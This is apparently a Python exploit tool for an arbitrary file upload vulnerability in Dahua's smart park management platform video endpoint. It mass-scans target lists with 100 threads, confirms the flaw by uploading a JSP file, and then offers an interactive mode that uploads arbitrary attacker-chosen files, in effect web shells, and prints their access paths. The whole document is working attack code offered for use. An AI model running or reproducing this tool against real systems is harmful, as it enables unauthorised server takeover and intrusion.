#大华 智慧园区综合管理平台 video 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限
#/publishing/publishing/material/file/video
#app="dahua-智慧园区综合管理平台"
# 导包
import requests,sys,argparse,re,time,colorama
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
# GREEN = '\033[92m' #GREEN是一个表示绿色的ANSI转义序列，\033[92m用于设置文本颜色为绿色，RESET是用于重置文本颜色的ANSI转义序列，\033[0m用于将文本颜色恢复为默认值。
# RESET = '\033[0m'
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               大华智慧园区综合管理平台video任意文件上传漏洞
"""
    print(banner)

# 主函数模块
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a 大华智慧园区综合管理平台video任意文件上传vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your urllink')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))
        
headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'804',
        'Content-Type':'multipart/form-data; boundary=dd8f988919484abab3816881c55272a7',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
}
# poc模块
def poc(target):
    payload_url ="/publishing/publishing/material/file/video"
    url = target+payload_url
    data = "--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\nTest\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n\r\n\r\n"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    #     }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
        result = target + '/publishingImg/'+ match.group(0)
        if  res.status_code == 200 and "success" in res.text:
            print( f"{BLUE}[+] {target} Vulnerability exists,\n {result} {RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else :
            print(f"[-] {target} Vulnerability does not exist")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return False       
    except Exception as e:
        print(f"[*] {target} server error,{e}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")
            return False


def exp(target):
    print("--------------------正在进行漏洞利用...---------------------")
    time.sleep(2)
    # os.system("cls")
    while True:
        filename = input("请输入你要上传的文件(q--->quit)\n>>>")
        content = input("请输入你要上传的内容:(q--->quit)\n>>>")
        if filename =='q' or content =='q':
            print("-------------正在退出,稍安勿躁 Wait a minute...-------------")
            print("Bye~欢迎下次光临")
            break
        data = f"--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{filename}\"\r\n\r\n{content}\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n\r\n\r\n"
        try:
            res = requests.post(url=target+'/publishing/publishing/material/file/video',headers=headers,data=data,timeout=5,verify=False)
            match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
            result = target + '/publishingImg/'+ match.group(0)
            if  res.status_code == 200 and "success" in res.text:
                print( f"{BLUE}[+] Upload successfully,Access path:{result} {RESET}")
            else:
                print(f"Fail to upload!")
        except:
            print("执行异常,Try again!")

if __name__ == '__main__':
    main()